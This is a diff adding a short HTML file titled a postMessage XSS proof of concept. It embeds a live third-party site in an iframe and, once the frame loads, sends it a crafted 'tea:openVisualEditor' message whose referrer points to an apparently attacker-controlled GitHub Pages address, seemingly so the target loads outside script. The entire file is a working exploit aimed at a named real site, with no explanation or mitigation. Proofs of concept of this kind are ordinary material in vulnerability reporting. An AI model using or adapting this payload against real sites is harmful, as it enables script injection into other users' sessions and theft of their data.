@@ -1,0 +1,15 @@
+<html>
+<body>
+<h2>postMessage XSS PoC</h2>
+<iframe id="target" src="https://www.pangleglobal.com/page" style="width:100%;height:500px"></iframe>
+<script>
+  const ATTACKER = 'https://telojos11.github.io/cekcek';
+  document.getElementById('target').onload = () => {
+    document.getElementById('target').contentWindow.postMessage(JSON.stringify({
+      type: 'tea:openVisualEditor',
+      payload: { referrer: ATTACKER }
+    }), '*');
+  };
+</script>
+</body>
+</html>
